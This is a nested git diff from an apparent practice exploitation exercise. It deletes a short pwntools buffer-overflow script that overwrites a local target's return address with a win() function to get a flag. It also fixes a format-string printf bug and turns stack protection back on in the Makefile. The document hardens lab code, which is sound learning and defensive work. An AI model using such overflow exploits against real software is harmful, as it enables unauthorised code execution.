@@ -1,0 +1,86 @@
+diff --git a/source/patch.diff b/source/patch.diff
+index 010a866..e69de29 100644
+--- a/source/patch.diff
++++ b/source/patch.diff
+@@ -1,64 +0,0 @@
+-diff --git a/source/hck.py b/source/hck.py
+-deleted file mode 100755
+-index 6392a88..0000000
+---- a/source/hck.py
+-+++ /dev/null
+-@@ -1,18 +0,0 @@
+--#!/usr/bin/env python3
+--
+--import os
+--import re
+--import sys
+--import time
+--from pwn import *
+--p = process(['/home/steve/hck/dummy/source/src/target'])
+--
+--
+--eip = p32(0x080492b6) # win()
+--esp = p32(0x08049332) # UnderConstruction()
+--print(p.recvuntil(b"Give me a string that gets you the flag").decode())
+--p.sendline(b"A"*(10 +12) + eip + esp)
+--
+--p.interactive()
+--a = p.readallS()
+--print(a)
+-diff --git a/source/patch.diff b/source/patch.diff
+-index bcad012..e69de29 100644
+---- a/source/patch.diff
+-+++ b/source/patch.diff
+-@@ -1,18 +0,0 @@
+--diff --git a/source/patch.diff b/source/patch.diff
+--index 99660cc..e69de29 100644
+----- a/source/patch.diff
+--+++ b/source/patch.diff
+--@@ -1,13 +0,0 @@
+---diff --git a/source/src/fmtstr.c b/source/src/fmtstr.c
+---index cce26f5..458cb18 100644
+------ a/source/src/fmtstr.c
+---+++ b/source/src/fmtstr.c
+---@@ -11,7 +11,7 @@ unsigned int secret = 0xdeadbeef;
+--- void handle_failure(char *buf) {
+---   char msg[100];
+---   snprintf(msg, sizeof(msg), "Invalid Password! %s\n", buf);
+----  printf(msg);
+---+  printf("%s", msg);
+--- }
+--- 
+--- int main(int argc, char *argv[])
+-diff --git a/source/src/Makefile b/source/src/Makefile
+-index c1cc544..9fa3837 100644
+---- a/source/src/Makefile
+-+++ b/source/src/Makefile
+-@@ -14,10 +14,10 @@ CFLAGS += -Wno-format-security
+- # CFLAGS += -z execstack
+- 
+- # enable SSP
+--#CFLAGS += -fstack-protector
+-+CFLAGS += -fstack-protector
+- 
+- # disable SSP
+--CFLAGS += -fno-stack-protector
+-+#CFLAGS += -fno-stack-protector
+- 
+- # enable ASLR
+- # CFLAGS += -pie -fPIE
+diff --git a/source/src/Makefile b/source/src/Makefile
+index c1cc544..9fa3837 100644
+--- a/source/src/Makefile
++++ b/source/src/Makefile
+@@ -14,10 +14,10 @@ CFLAGS += -Wno-format-security
+ # CFLAGS += -z execstack
+ 
+ # enable SSP
+-#CFLAGS += -fstack-protector
++CFLAGS += -fstack-protector
+ 
+ # disable SSP
+-CFLAGS += -fno-stack-protector
++#CFLAGS += -fno-stack-protector
+ 
+ # enable ASLR
+ # CFLAGS += -pie -fPIE
